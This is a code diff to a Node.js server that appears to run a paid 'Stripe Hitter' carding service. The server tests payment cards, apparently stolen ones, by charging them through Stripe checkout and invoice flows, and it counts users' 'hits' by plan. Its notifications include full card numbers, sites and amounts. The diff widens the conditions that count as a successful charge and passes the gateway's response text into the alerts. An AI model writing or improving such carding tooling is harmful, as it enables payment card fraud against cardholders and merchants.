@@ -466,6 +466,10 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount, 
 
     const gatewayName = gate === 'checkout' ? 'Stripe Checkout Hitter' : (gate === 'invoice' ? 'Stripe Invoice Hitter' : 'Stripe Hitter');
 
+    const responseMsg = (res.message && res.message.length > 5 && !res.message.includes('resp')) 
+        ? res.message 
+        : 'Charged Successfully';
+
     // Message for Personal Log (Shows everything)
     const personalMsg = `
 🔥 <b>HIT DETECTED</b> ⚡
@@ -473,7 +477,7 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount, 
 🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
 💳 <b>Card</b>: <code>${card}</code>
 ↔️ <b>Gateway</b>: ${gatewayName}
-✅ <b>Response</b>: Charged Successfully
+✅ <b>Response</b>: ${responseMsg}
 🌐 <b>Site</b>: ${site}
 💰 <b>Amount</b>: ${amount}
 `.trim();
@@ -484,7 +488,7 @@ async function sendHitNotification(res, gate, userPlan, userName, site, amount, 
 👤 <b>User</b>: <code>${userName}</code> 🇧🇩
 🆙 <b>Plan</b>: ${userPlan.toUpperCase()}
 ↔️ <b>Gateway</b>: ${gatewayName}
-✅ <b>Response</b>: Charged Successfully
+✅ <b>Response</b>: ${responseMsg}
 🌐 <b>Site</b>: ${site}
 💰 <b>Amount</b>: ${amount}
 
@@ -628,8 +632,18 @@ app.post('/hit-proxy/:gate', async (req, res) => {
         const status = (result.status || '').toLowerCase();
         const lowerMsg = (result.message || result.error || '').toLowerCase();
 
-        // ONLY deduct from limit if strictly 'charged' or 'approved' or if session is already succeeded
-        if (status === 'charged' || status === 'approved' || lowerMsg.includes('checkout_succeeded_session')) {
+        // Expanded Success Indicators
+        const isSuccess = status === 'charged' || 
+                         status === 'approved' || 
+                         status === 'succeeded' || 
+                         status === 'success' || 
+                         status === 'live' ||
+                         lowerMsg.includes('checkout_succeeded_session') ||
+                         lowerMsg.includes('payment_intent_succeeded') ||
+                         lowerMsg.includes('charged successfully');
+
+        // Deduct from limit and notify if success is detected
+        if (isSuccess) {
             // ONLY increment hits for FREE users. Premium users stay at 0.
                 if (user.plan === 'free') {
                     user.hits_today++;
@@ -639,6 +653,12 @@ app.post('/hit-proxy/:gate', async (req, res) => {
                 
                 await storage.saveUser(chatId, user);
                 console.log(`[Limit] SUCCESS for ${chatId} (${user.plan}). Total hits: ${user.total_hits}`);
+                
+                // Use original message if informative, otherwise use default
+                const notifyMsg = (result.message && result.message.length > 5 && !result.message.includes('resp')) 
+                    ? result.message 
+                    : 'Charged Successfully';
+                
                 await sendHitNotification(result, gate, user.plan, userName, site, amount, card);
         } else {
             console.log(`[Limit] FAILED/DECLINED for ${chatId} (${status}). Limit NOT deducted.`);
